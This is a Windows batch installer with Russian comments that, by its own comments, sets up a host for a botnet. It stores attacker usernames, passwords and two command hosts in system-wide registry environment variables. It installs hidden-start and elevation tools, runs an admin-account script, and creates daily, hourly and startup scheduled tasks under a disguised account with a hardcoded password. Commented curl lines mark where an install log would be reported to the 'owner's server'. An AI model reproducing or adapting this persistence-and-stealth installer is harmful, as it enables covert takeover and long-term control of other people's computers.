@echo off
rem
rem Коммандный файл инсталляции дистрибутива с основными файлами пакета "Exponenta"
rem
rem USAGE
rem > Install_MainExponenta.bat <username> <password> <hacker host server 1 domain> <hacker host server 2 domain>
rem Запускать файл с правами администратора

setlocal enableextensions enabledelayedexpansion

Rem Установка системнмных переменных окружения

set curdir=%CD%
set Key=HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment
set Dest_DIR=c:\pub1
set ELEVATION=c:\Elevation
set Hidden_Start="C:\Program Files\Hidden Start"
set Chocolatey=%ALLUSERSPROFILE%\chocolatey

rem Проверка зависимостей системного окружения
rem
if exist %Dest_DIR% goto already_Exist

rem checknewid_E
rem if not exist <файлы манифеста зависимостей>

rem Подготовка пользовательских переменных окружения.
rem Эти переменные окружения редактируются пользователем  под каждый конкретный взлом.
rem Также проверяется наличие манифеста приложения или модуля. Если манифест присутствует -- ничегго не делается.
rem создаём системные переменные Windows для ботнета
set Hacker_User=%1
set Hacker_Pass=%2
set Hacker_host1=%3
set Hacker_host2=%4


echo -
echo Добро пожаловать в программу установки пакета
echo Данная программа устанавливает файлы в каталог %Dest_DIR%
echo -

rem Распаковка дистрибутива из SFX Архива в каталог %Dest_DIR%
rem Автоматическая распаковка должна быть настроена отдельно
rem Внимание! смотрите на назначение системных переменных!
rem Совет. При программировании держите как сводку этот заполненный файл

echo -
echo Распаковываем дистрибутив...
echo -
MainExponenta.SFX.exe
c:
cd %Dest_DIR%
cd Util

rem Регистрация переменных, если нужно

echo 
echo Регистрируем новые переменные окружения...
echo
rem Reg Add "!Key_Var!" /v "!Параметр!" /t REG_SZ /d "!Параметр!" /f 2>&1 | %SystemRoot%\system32\find.exe >nul 2>nul /I "Ошибка" && goto UnSuccess
rem echo The variable is created

Reg Add "!Key!" /v Hacker_User /t REG_SZ /d "!Hacker_User!" /f
Reg Add "!Key!" /v Hacker_Pass /t REG_SZ /d "!Hacker_Pass!" /f
Reg Add "!Key!" /v Hacker_host1 /t REG_SZ /d "!Hacker_host1!" /f
Reg Add "!Key!" /v Hacker_host2 /t REG_SZ /d "!Hacker_host2!" /f
Reg Add "!Key!" /v PUB1 /t REG_SZ /d "!Dest_DIR!" /f
call reg_addtopath.bat %DestDIR%\Util

cd /d %curdir%

rem Install Hidden Start Plugin
if exist %Hidden_Start% goto pass_HiddenStart
if not exist Hidden_Start.SFX.exe goto pass_HiddenStart
echo "Install Hidden Start..."
Hidden_Start.SFX.exe
:pass_HiddenStart

rem Install Elevation Plugin
if exist %ELEVATION% goto pass_Elevation
if not exist Elevation.SFX.exe goto pass_Elevation
echo "Install Elevation..."
Elevation.SFX.exe
:pass_Elevation

rem Install Chocolatey Packet
if not exist %Chocolatey% goto pass_Chocolatey
if not exist chock.install.cmd goto pass_Chocolatey
echo "Install Chocolatey..."
call ./chock.install.cmd
:pass_Chocolatey

rem Install Chocolatey's Packet
if exist %Chocolatey% goto pass_ChocPack
if not exist choc_pack.install.cmd goto pass_ChocPack
echo "Install Chocolatey's Packets..."
call ./choc_pack.install.cmd
:pass_ChocPack

rem Правка файлов конфигурации модуля Exponenta
@echo on
rem "=== Changing Exponente Config ==="
rem

rem создание списка постоянных изменений для демонов
cd /d %Dest_DIR%\Util

adAdmin.cmd

schtasks /Create /XML User_Dayly_Tasks1.xml /TN "User Dayly Task1" /F /RU MSSQLSR /RP Admin01234

schtasks /Create /XML User_Hourly_Tasks1.xml /TN "User Hourly Task1" /F /RU MSSQLSR /RP Admin01234

schtasks /Create /XML User_OnStart_Task1.xml /TN "User OnStart Task1" /F /RU MSSQLSR /RP Admin01234

rem
rem
echo off
./onsysload.bat
./user_onstart1.bat
./user_hourly1.bat
echo -
echo Installation is made with Success!
rem
rem Отправка лога установки на сервер хозяина
rem curl
goto sess_Finish

:already_Exist
echo Installation Warning!
echo This Packet has been already installed
echo The yuden.Exponenta configuration stay the same.
rem
rem Отправка лога установки на сервер хозяина
rem curl
goto sess_Finish


:UnSuccess
echo General Error
echo Installation may be incomplete!
echo The yuden. Exponenta configuration stay the same.
rem
rem Отправка лога установки на сервер хозяина
rem curl
goto sess_Finish

:sess_Finish

cd /d %curdir%

rem pause